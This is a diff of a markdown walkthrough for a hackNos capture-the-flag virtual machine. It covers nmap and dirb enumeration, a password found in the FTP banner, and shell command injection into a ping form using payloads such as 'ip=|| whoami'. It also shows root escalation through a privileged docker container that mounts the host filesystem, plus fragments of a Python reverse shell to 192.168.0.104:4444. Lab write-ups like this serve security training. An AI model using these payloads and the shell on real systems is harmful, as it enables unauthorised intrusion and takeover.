@@ -12,45 +12,62 @@
 
 ## Enumeration
 - VM IP: `sudo netdiscover`
-	* `192.168.0.12     08:00:27:89:20:c1      1      60  VMWare`
-- VM info: `nmap -A 192.168.0.12`
-	* `21/tcp open  ftp` Anonymous log-in is on. --> FTP Banner "ftp 'Security@hackNos'"
-	* `22/tcp open  ssh`
-	* `80/tcp open  http`
-- web server info: `dirb -w http://192.168.0.12` 
-	* http://192.168.0.12/index.html
-	* http://192.168.0.12/css/style.css
-	* http://192.168.0.12/css/2.jpg
-- web server 192.168.0.12/5ecure login using:
-	* admin:Security@hackNos <-- Banner
-- web server info: `dirb -w http://192.168.0.12/5ecure`		
-	* http://192.168.0.12/5ecure/index.html
-		* form POSTs data to output.php
-	* http://192.168.0.12/5ecure/css/style.css
-	* http://192.168.0.12/5ecure/css/2.jpg
-	* http://192.168.0.12/5ecure/output.php
-		* simple ping <ip> function + stdout
+
+	* `VMWare 192.168.0.12 `
+	
+- VM info: `nmap -A -T4 -v 192.168.0.12`
+	
+	* <pre>
+	  21/tcp open  ftp     vsftpd 2.0.8 or later
+	  22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
+	  880/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+	  </pre>
+	* FTP **Anonymous** log-in is on. 
+		* FTP Server Banner: "ftp 'Security@hackNos'"
+	  
+- Web Server Directory: `dirb -w http://192.168.0.12` 
+
+	* <pre>
+	  http://192.168.0.12/index.html
+	  http://192.168.0.12/css/style.css
+	  http://192.168.0.12/css/2.jpg
+	  </pre>
+	  
+- Web Server 192.168.0.12/5ecure login using:
+
+	* admin:Security@hackNos, FTP Server Banner
+
+- Web Server Directory: `dirb -w http://192.168.0.12/5ecure`		
+	* <pre>
+	  http://192.168.0.12/5ecure/index.html, form that POSTs data to output.php
+	  http://192.168.0.12/5ecure/css/style.css
+	  http://192.168.0.12/5ecure/css/2.jpg
+	  http://192.168.0.12/5ecure/output.php, simple ping <ip> function + stdout
+	  </pre>
 ---
 	
 ## Penetration
-- 192.168.0.12/5ecure/out.php:
+- 192.168.0.12/5ecure/out.php
+
 	* `exec(ping $ip)`, possible shell injection 
-- $ip = || command, '; + command', '&& + command', '& + command' didn't work out, char escape probably 
-- Examples:
-	* ip=|| ls 
-		* system navigation
-	* ip=|| whoami 
-		* www-data
-	* ip=|| vi *file*
-		* privilege check
-	* ip=|| export	
+	
+- $ip = || command
+
+	* '; command' / '&& command' / '& command' didn't work out, possible character escape 
+	* Examples:
+		* ip=|| ls, *system navigation*
+		* ip=|| whoami, *www-data*
+		* ip=|| vi *filename*, *privilege check*
+		* ip=|| export	
 
 - [intresting files](#intresting-files):
+
 	* /var/opt/python.py, creates a connection to 192.168.0.104:4444 and runs an interactive shell
 	* /etc/passwd, user information
 ---
 
 ## Escelation
+
 - `ssh 192.168.0.12 -l recon`
 	* pass: Security@hackNos
 - `docker run -it --privileged --name=ctf -v /:/host:rw alpine sh`
@@ -60,7 +77,6 @@
 ## Bonus
 
 ### CLI 
-_Bonus, not necessary_
 - configurate host/attacking machine network settings
 	* add a new network connection and manualy set it up:
 		- IP: 192.168.0.104
@@ -89,6 +105,7 @@ _Bonus, not necessary_
 	os.dup2(s.fileno(), 2)
 	p = subprocess.call(["/bin/bash", "-i"])
 	```
+	
 - /var/etc:
 	```
 	root:x:0:0:root:/root:/bin/bash
